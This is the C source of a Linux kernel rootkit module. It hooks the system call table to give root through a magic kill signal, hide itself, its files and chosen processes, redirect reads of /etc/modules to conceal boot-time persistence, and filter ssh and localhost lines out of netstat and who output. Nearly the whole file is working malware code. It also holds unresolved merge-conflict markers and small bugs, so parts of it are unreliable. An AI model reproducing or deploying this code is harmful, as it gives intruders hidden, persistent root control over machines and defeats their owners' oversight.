#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/dirent.h>
<<<<<<< HEAD
#include <linux/uaccess.h>
#include <linux/namei.h>
#include <linux/errno.h>
=======
#include <linux/proc_fs.h>
>>>>>>> 421c0d1e99a541c739731c4949e9eec449f509dc

#include "modify_syscalls.h"

//Macro functions to allow us to write to protected memory
#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

#define START_ADDRESS 0xffffffff81000000
#define END_ADDRESS 0xffffffffa2000000
#define SYS_CALL_NUM 300

#define SIG_GIVE_ROOT 32
#define SIG_HIDE 33
#define SIG_UNHIDE 34
#define SIG_HIDEPID 35

// this are the filenames we want to hide
// used in hacked_getdents(...)
const int   TO_HIDE_SIZE = 4;
const char* TO_HIDE[]    = { "test_file.txt", "modules_original", "rootkit", "virus" };
char hidePID[6] = "-1";

// location of modules file
#define FILE_MODULES               "/etc/modules\0"
#define FILE_MODULES_ORIGINAL      "/etc/modules_original\0"
#define FILE_TO_APPEND             "/lib/modules/3.2.0-126-generic/kernel/drivers/rootkit/to_append.txt\0"

// 'map' for replacement open operations
// e.g. trying to open dog.txt will get you red.txt instead
const int   replacement_size     = 1;
const char* replacement_keys[]   = { "/etc/modules\0" };
const char* replacement_values[] = { "/etc/modules_original\0" };

// 1 = custom boot-loader installed; run modified syscalls
// 0 = custom boot-loader not yet installed; don't use modified syscalls
int boot_loader_init = 0;


//Getting our original
asmlinkage int (*original_sysinfo)(struct sysinfo *);
asmlinkage int (*original_kill)(pid_t, int);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_stat)(const char *path, struct stat *buf);
asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
asmlinkage int (*original_open)(const char __user *pathname, int flags, mode_t mode);
asmlinkage int (*original_write)(unsigned int fd, const char *buf, size_t count);

struct list_head *module_list;

void update_sys_calls(void **sys_call_table){
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = hacked_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = hacked_kill;
    void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
    void *modified_function_getdents = hacked_getdents;
    void **modified_at_address_stat = &sys_call_table[__NR_stat];
    void *modified_function_stat = hacked_stat;
    void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
    void *modified_function_lstat = hacked_lstat;
    void **modified_at_address_open = &sys_call_table[__NR_open];
    void *modified_function_open = hacked_open;
    void **modified_at_address_write = &sys_call_table[__NR_write];
    void *modified_function_write = hacked_write;

    DISABLE_W_PROTECTED_MEMORY
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
    original_stat = xchg(modified_at_address_stat, modified_function_stat);
    original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
    original_open = xchg(modified_at_address_open, modified_function_open);
    original_write = xchg(modified_at_address_write, modified_function_write);
    ENABLE_W_PROTECTED_MEMORY
}

void revert_to_original(void **sys_call_table){
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = original_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = original_kill;
    void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
    void *modified_function_getdents = original_getdents;
    void **modified_at_address_stat = &sys_call_table[__NR_stat];
    void *modified_function_stat = original_stat;
    void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
    void *modified_function_lstat = original_lstat;
    void **modified_at_address_open = &sys_call_table[__NR_open];
    void *modified_function_open = original_open;
    void **modified_at_address_write = &sys_call_table[__NR_write];
    void *modified_function_write = original_write;

    DISABLE_W_PROTECTED_MEMORY
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
    original_stat = xchg(modified_at_address_stat, modified_function_stat);
    original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
    original_open = xchg(modified_at_address_open, modified_function_open);
    original_write = xchg(modified_at_address_write, modified_function_write);
    ENABLE_W_PROTECTED_MEMORY
}

asmlinkage int hacked_sysinfo(struct sysinfo *info)
{
    original_sysinfo(info);
    info->uptime = 0;
    return 0;
}

asmlinkage int hacked_kill(pid_t pid, int sig)
{
    struct task_struct *task;

    switch(sig) {
        case SIG_GIVE_ROOT:
            give_root();
            break;
        case SIG_HIDE:
            hide();
            break;
        case SIG_UNHIDE:
            unhide();
            break;
        case SIG_HIDEPID:
            sprintf(hidePID, "%d", pid);
            break;
        default:
            return original_kill(pid, sig);
    }
    return 0;
}

// code heavily inspired by:
// https://exploit.ph/linux-kernel-hacking/2014/07/10/system-call-hooking/
asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    int reclen;
    char* next_rec;
    long len;
    int flag_matched = 0;
    // run the actual system call
    // (this returns the number of bytes read)
    int ret = original_getdents(fd, dirp, count);

    // loop through the returned struct
    struct linux_dirent *cur = dirp;
    int i = 0, j = 0;
    while (i < ret) {
        // if we see the filename which we want to hide,
        // then modify the number of bytes read
        // & move on
        for (j = 0; j < TO_HIDE_SIZE; j++) {
            const char* to_hide = TO_HIDE[j];
            if (strncmp(cur->d_name, to_hide, max_m(strlen(cur->d_name), strlen(to_hide))) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
                // printk("Tried to getdents %s; hiding...\n", to_hide);
                // length of the linux_dirent
                reclen = cur->d_reclen;
                // calc. the next file/directory location
                next_rec = (char*) cur + reclen;

                //      = end location of our directory - next file/directory location
                len = (long) dirp + ret - (long) next_rec;
                // move onto the next directory/file
                // (this copies bytes from next_rec into cur)
                memmove(cur, next_rec, len);
                // update our return value so it isn't suspicious
                ret -= reclen;

                flag_matched = 1;
                break;
            }
        }
        if (flag_matched == 0) {
            // we don't match -
            // move on to the next directory/file
            i += cur->d_reclen;
            cur = (struct linux_dirent*) ((char*) dirp + i);
        }
        flag_matched = 0;
    }

    return ret;
}

// given a filename w/ path, replaces with just filename
// returns string w/o path
const char* strip_filepath(const char* filepath) {
    const char* loc = strrchr(filepath, '/');
    if (loc == NULL) {
        // there is no path - only a filename
        return filepath;
    } else {
        return loc + sizeof(char);
    }
}

// code heavily inspired by:
// https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/index.html
// NOTE: this does not append 'No such file or directory' to the end;
asmlinkage int hacked_stat(const char *path, struct stat *buf) {
    int j;
    const char* filename = strip_filepath(path);
    for (j = 0; j < TO_HIDE_SIZE; j++) {
        const char* to_hide = TO_HIDE[j];
        if (strncmp(filename, to_hide, max_m(strlen(filename), strlen(to_hide))) == 0) {
            // printk("Tried to stat %s; hiding...\n", to_hide);
            return -ENOENT;
        }
    }
    return original_stat(path, buf);
}

asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
    int j;
    const char* filename = strip_filepath(path);
    for (j = 0; j < TO_HIDE_SIZE; j++) {
        const char* to_hide = TO_HIDE[j];
        if (strncmp(filename, to_hide, max_m(strlen(filename), strlen(to_hide))) == 0) {
            // printk("Tried to lstat %s; hiding...\n", to_hide);
            return -ENOENT;
        }
    }
    return original_lstat(path, buf);
}

asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) {
    int fd;
    mm_segment_t old_fs;
    if (boot_loader_init == 1) {
        // this can use relative path as well so we need to check only the filename.
        const char* pathname_stripped = strip_filepath(pathname);

        int i;
        for (i = 0; i < replacement_size; i++) {
            // check if pathname is in map
            const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
            if (strncmp(pathname_stripped, replacement_key_stripped, max_m(strlen(pathname_stripped), strlen(replacement_key_stripped))) == 0) {
                // redirect to replacement file
                // printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);

                // use user file system
                old_fs = get_fs();
                set_fs(get_ds());

                fd = original_open(replacement_values[i], flags, mode);

                // return to kernel space
                set_fs(old_fs);

                return fd;
            }
        }
    }

    return original_open(pathname, flags, mode);
}

asmlinkage int hacked_write(unsigned int fd, const char *buf, size_t count){
    //modify the write syscall
    //anytime ssh is to be written (like netstat) with file descriptor = 1 (to standard output or terminal), we hide it (for netstat, ss etc)
    //anytime 127.0.0.1 is to be written, dont display (this is localhost, what we use to access through ssh - or at least what shows) (for last, who, etc...)
    //use `strace` to find what words are written to standard output for each of the frequently used networking commands (who, w, netstat, ss, last)

    char *keyWords[4] = {":ssh", "127.0.0.1", "localhost", ":22", "(127.0.0.1)"};
    int i = 0;

    if (fd == 1) {
        //spot our 'keywords'
        //if they are here, dont write anything at all
        for(i; i < 4; i++){
            if (strstr(buf, keyWords[i]) != NULL) {
                return count;
            }
        }
    }
    //else, write as normal
    return original_write(fd, buf, count);
}


void give_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
    	return;
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
 
    commit_creds(newcreds);
}

void hide(void)
{
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide(void)
{
    list_add(&THIS_MODULE->list, module_list);
}

void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < (void*)END_ADDRESS) {
        sctable = (void **) i;
        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
        size_t j;
        // sanity check: no function pointer in the system call table should be NULL
        for (j = 0; j < SYS_CALL_NUM; j ++) {
            if (sctable[j] == NULL) {
                goto skip;
            }
        }
        return sctable;
        }
        skip:
        i += sizeof(void *);
    }

    return NULL;
}

// ref: https://www.linuxjournal.com/article/8110
//      https://en.it1352.com/article/bd12740c86574c22aff0e5b2b89680e4.html
// could have done this with function pointers? using lower level stuff tho
// you should delete the new file before calling this (if it already exists)
int clone_file(const char* filename_old, const char* filename_new) {
    int err;
    ssize_t ret_old = 0, ret_new = 0;
    unsigned char buf[1];
    struct file *filp_old   = NULL;
    struct file *filp_new = NULL;
    loff_t pos_read;
    loff_t pos_write;
    loff_t end;
    loff_t new_end;
    int i;

    // go into userspace
    mm_segment_t old_fs = get_fs();
    set_fs(get_ds());

    // open first file for reading
    filp_old = filp_open(filename_old, O_RDONLY, 0);
    if (IS_ERR(filp_old)) {
        err = PTR_ERR(filp_old);
        return 0;
    }

    // open second file for writing
    filp_new = filp_open(filename_new, O_WRONLY | O_CREAT, 0);
    if (IS_ERR(filp_new)) {
        err = PTR_ERR(filp_new);
        return 0;
    }

    // we need to reset the pos after seeking the end
    pos_read  = filp_old->f_pos;
    pos_write = filp_new->f_pos;
    end = vfs_llseek(filp_old, 0, SEEK_END);
    new_end = vfs_llseek(filp_new, 0, SEEK_END);
    filp_old->f_pos = pos_read;
    filp_new->f_pos = pos_write;

    // clone all bytes
    for (i = 0; i < end; i++) {
        ret_old = vfs_read(filp_old, buf, 1, &pos_read);    
        ret_new = vfs_write(filp_new, buf, 1, &pos_write);
    }
    // write NULLs for the rest, incase file already exists
    buf[0] = '\0';
    for (i = end; i < new_end; i++) {
        ret_new = vfs_write(filp_new, buf, 1, &pos_write);
    }

    // reset file positions
    if (ret_old > 0) { filp_old->f_pos = pos_read; }
    if (ret_new > 0) { filp_new->f_pos = pos_write; }

    filp_close(filp_new, NULL);
    filp_close(filp_old, NULL);

    // return to kernel space
    set_fs(old_fs);

    return 1;
}

// renames a file. creates if it doesn't exist - overwrites if it already does
int rename_file(const char* filename_old, const char* filename_new) {
    int err;
    ssize_t ret;
    struct file *filp_old = NULL;
    struct file *filp_new = NULL;
    struct inode*  old_dir;
    struct dentry* old_dentry;
    struct inode*  new_dir;
    struct dentry* new_dentry;

    // use user file system
    mm_segment_t old_fs = get_fs();
    set_fs(get_ds());

    // open old file for reading
    filp_old = filp_open(filename_old, O_RDONLY, 0);
    if (IS_ERR(filp_old)) {
        err = PTR_ERR(filp_old);
        return 0;
    }

    // open new file for writing
    filp_new = filp_open(filename_new, O_WRONLY | O_CREAT, 0);
    if (IS_ERR(filp_new)) {
        err = PTR_ERR(filp_new);
        return 0;
    }

    old_dir    = (filp_old->f_dentry->d_parent)->d_inode;
    old_dentry = filp_old->f_dentry;
    new_dir    = (filp_new->f_dentry->d_parent)->d_inode;
    new_dentry = filp_new->f_dentry;

    // use mutex?
    // lock_rename(filp_old->f_dentry, filp_new->f_dentry);
    ret = vfs_rename(old_dir, old_dentry, new_dir, new_dentry);
    // unlock_rename(filp_old->f_dentry, filp_new->f_dentry);

    // close both files
    filp_close(filp_new, NULL);
    filp_close(filp_old, NULL);

    // close old file system
    set_fs(old_fs);

    return ret;
}

// appends the contents of file1 to file2
int append_to_file(const char* filename1, const char* filename2) {
    int err;
    unsigned char buf[1];
    struct file *filp1 = NULL;
    struct file *filp2 = NULL;
    loff_t pos_read;
    loff_t pos_write;
    loff_t f1_end, f2_end;
    mm_segment_t old_fs;
    int i;
    ssize_t ret_old = 0, ret_new = 0;
    // printk("appending contents of %s onto %s\n", filename1, filename2);

    // go into userspace
    old_fs = get_fs();
    set_fs(get_ds());

    // open first file for reading
    filp1 = filp_open(filename1, O_RDONLY, 0);
    if (IS_ERR(filp1)) {
        err = PTR_ERR(filp1);
        return 0;
    }

    // open second file for writing
    filp2 = filp_open(filename2, O_WRONLY | O_CREAT, 0);
    if (IS_ERR(filp2)) {
        err = PTR_ERR(filp2);
        return 0;
    }

    // we need to reset the pos after seeking the end
    pos_read  = filp1->f_pos;
    pos_write = filp2->f_pos;
    f1_end = vfs_llseek(filp1, 0, SEEK_END);
    filp1->f_pos = pos_read;
    // go to end of file2 (since we are appending)
    f2_end = vfs_llseek(filp2, 0, SEEK_END);
    pos_write = f2_end;

    // clone all bytes
    for (i = 0; i < f1_end; i++) {
        ret_old = vfs_read(filp1, buf, 1, &pos_read);    
        ret_new = vfs_write(filp2, buf, 1, &pos_write);
    }

    // reset file positions
    if (ret_old > 0) { filp1->f_pos = pos_read; }
    if (ret_new > 0) { filp2->f_pos = pos_write; }

    filp_close(filp2, NULL);
    filp_close(filp1, NULL);

    // return to kernel space
    set_fs(old_fs);

    return 1;
}

int delete_file(const char* filename) {
    int err;
    ssize_t ret;
    mm_segment_t old_fs;
    struct file *filp = NULL;

    // printk("deleting file %s\n", filename);

    // go into userspace
    old_fs = get_fs();
    set_fs(get_ds());

    // open first file for reading
    filp = filp_open(filename, O_WRONLY, 0);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return 0;
    }

    ret = vfs_unlink(filp->f_dentry->d_parent->d_inode, filp->f_dentry);

    filp_close(filp, NULL);

    // return to kernel space
    set_fs(old_fs);

    return 1;
}

// 0 = doesn't, 1 = does
// pretty hacky
int does_file_exist(const char* filename) {
    int ret;
    struct file *filp = NULL;
    // use user file system
    mm_segment_t old_fs = get_fs();
    set_fs(get_ds());

    // error = doesn't exist? probably.
    filp = filp_open(filename, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        ret = 0;
    } else {
        filp_close(filp, NULL);
        ret = 1;
    }

    // close old file system
    set_fs(old_fs);

    return ret;
}

umode_t get_file_permissions(const char* filename) {
    int ret;
    struct file *filp = NULL;
    // use user file system
    mm_segment_t old_fs = get_fs();
    set_fs(get_ds());

    // error = doesn't exist? probably.
    filp = filp_open(filename, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        ret = -1;
        set_fs(old_fs);
        return ret;
    }
    
    // [777]o === [511]d
    // ret = filp->f_dentry->d_inode->i_mode & 511;
    ret = filp->f_dentry->d_inode->i_mode;

    filp_close(filp, NULL);
    // close old file system
    set_fs(old_fs);

    return ret;
}

void set_file_permissions(const char* filename, int file_perms) {
    int ret;
    struct file *filp = NULL;
    // use user file system
    mm_segment_t old_fs = get_fs();
    set_fs(get_ds());

    // error = doesn't exist? probably.
    filp = filp_open(filename, O_WRONLY, 0);
    if (IS_ERR(filp)) {
        ret = -1;
        set_fs(old_fs);
        return;
    }
    
    // is this OK to do? maybe
    ret = filp->f_dentry->d_inode->i_mode = file_perms;

    filp_close(filp, NULL);
    // close old file system
    set_fs(old_fs);
}

// runs a bash command
int run_bash(char* command) {
    int res;
    char* argv[4];
    char* envp[4];

    argv[0] = "bin/bash";
    argv[1] = "-c";
    argv[2] = command;
    argv[3] = NULL;

    envp[0] = "HOME=/";
    envp[1] = "TERM=linux";
    envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
    envp[3] = NULL;

    res = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return res;
}

void add_to_reboot(void) {
    boot_loader_init = 0;

    // first boot only
    if (!does_file_exist(FILE_MODULES_ORIGINAL)) {
        // on first boot, copy the original:
        clone_file(FILE_MODULES, FILE_MODULES_ORIGINAL);
        // & append 'insmod rookit' to the actual file
        append_to_file(FILE_TO_APPEND, FILE_MODULES);
    }

    // (redirect all access to FILE_MODULES during rootkit run)
    
    boot_loader_init = 1;
}

void add_to_reboot_exit(void) {
    // on module exit: copy _original to the actual filepath
    // & append again
    // NOTE: we *could* just do this on one file at the end instead
    //       of having two files, but this method ensures that
    //       even if this func. is not called the rootkit will
    //       be reloaded
    boot_loader_init = 0;
    // clone_file(FILE_MODULES_ORIGINAL, FILE_MODULES);
    rename_file(FILE_MODULES_ORIGINAL, FILE_MODULES);
    clone_file(FILE_MODULES, FILE_MODULES_ORIGINAL);
    append_to_file(FILE_TO_APPEND, FILE_MODULES);
    boot_loader_init = 1;
}

int max_m(int a, int b) {
    return a > b ? a : b;
}